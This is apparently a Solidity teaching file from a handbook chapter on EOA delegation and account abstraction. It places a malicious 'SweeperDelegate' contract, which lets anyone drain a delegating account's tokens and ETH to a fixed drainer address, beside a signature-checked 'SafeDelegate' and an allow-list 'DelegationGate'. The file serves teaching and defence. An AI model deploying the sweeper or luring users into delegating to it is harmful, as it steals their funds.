// SPDX-License-Identifier: MIT
// 配套章节：15 账户抽象与新型钱包 3.2 节 ｜ 交互实验：interactive/phishing-signature-lab.html
// 仅用于学习。不要部署到主网。
pragma solidity ^0.8.20;

interface IERC20Lite {
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 amt) external returns (bool);
}

/// @notice ❌ 恶意委托目标：EOA 委托给它之后，任何人都能清空该 EOA
contract SweeperDelegate {
    address payable public immutable drainer;

    constructor(address payable _drainer) {
        drainer = _drainer;
    }

    // ❌ 漏洞：没有权限检查。address(this) 是受害者 EOA。
    function sweep(IERC20Lite[] calldata tokens) external {
        for (uint256 i; i < tokens.length; i++) {
            tokens[i].transfer(drainer, tokens[i].balanceOf(address(this)));
        }
        (bool ok, ) = drainer.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }

    // ❌ 漏洞：EOA 之后收到的 ETH 也被自动转走。委托不随交易结束而失效。
    receive() external payable {
        (bool ok, ) = drainer.call{value: msg.value}("");
        require(ok, "forward failed");
    }
}

/// @notice ✅ 防御版委托目标：只接受 EOA 自身发起，或持有 EOA 私钥的 EIP-712 签名
contract SafeDelegate {
    // ✅ 修复：使用命名空间槽位。EOA 更换委托目标后，旧存储仍然留在 EOA 上。
    bytes32 private constant NONCE_SLOT = keccak256("handbook.safe-delegate.nonce");
    bytes32 private constant DOMAIN_TYPEHASH =
        keccak256("EIP712Domain(string name,uint256 chainId,address verifyingContract)");
    bytes32 private constant EXECUTE_TYPEHASH =
        keccak256("Execute(address target,uint256 value,bytes32 dataHash,uint256 nonce,uint256 deadline)");

    function nonce() public view returns (uint256 n) {
        bytes32 slot = NONCE_SLOT;
        assembly {
            n := sload(slot)
        }
    }

    function digest(address target, uint256 value, bytes calldata data, uint256 deadline) public view returns (bytes32) {
        bytes32 domain = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256("SafeDelegate"), block.chainid, address(this)));
        bytes32 structHash = keccak256(abi.encode(EXECUTE_TYPEHASH, target, value, keccak256(data), nonce(), deadline));
        return keccak256(abi.encodePacked("\x19\x01", domain, structHash));
    }

    /// @dev ✅ 修复：签名绑定链、账户、nonce、deadline 和调用内容
    function execute(address target, uint256 value, bytes calldata data, uint256 deadline, uint8 v, bytes32 r, bytes32 s)
        external
    {
        require(block.timestamp <= deadline, "expired");
        address recovered = ecrecover(digest(target, value, data, deadline), v, r, s);
        require(recovered != address(0) && recovered == address(this), "not account owner");
        _bumpNonce();
        _call(target, value, data);
    }

    /// @dev ✅ 修复：直接调用时，只有 EOA 自己可以调用
    function executeSelf(address target, uint256 value, bytes calldata data) external {
        require(msg.sender == address(this), "not self");
        _call(target, value, data);
    }

    function _bumpNonce() private {
        bytes32 slot = NONCE_SLOT;
        assembly {
            sstore(slot, add(sload(slot), 1))
        }
    }

    function _call(address target, uint256 value, bytes calldata data) private {
        (bool ok, ) = target.call{value: value}(data);
        require(ok, "call failed");
    }

    receive() external payable {}
}

/// @notice ✅ 钱包或协议一侧的检查：读取 0xef0100 委托标记，只认白名单目标
contract DelegationGate {
    mapping(address => bool) public approved;

    constructor(address[] memory targets) {
        for (uint256 i; i < targets.length; i++) approved[targets[i]] = true;
    }

    /// @return 委托目标；普通 EOA 或普通合约返回 address(0)
    function delegateOf(address account) public view returns (address) {
        bytes memory code = account.code;
        if (code.length != 23 || code[0] != 0xef || code[1] != 0x01 || code[2] != 0x00) return address(0);
        uint160 target;
        for (uint256 i = 3; i < 23; i++) target = (target << 8) | uint160(uint8(code[i]));
        return address(target);
    }

    /// @notice 账户未委托，或委托目标在白名单中，返回 true
    function isAcceptable(address account) external view returns (bool) {
        address target = delegateOf(account);
        return target == address(0) || approved[target];
    }
}
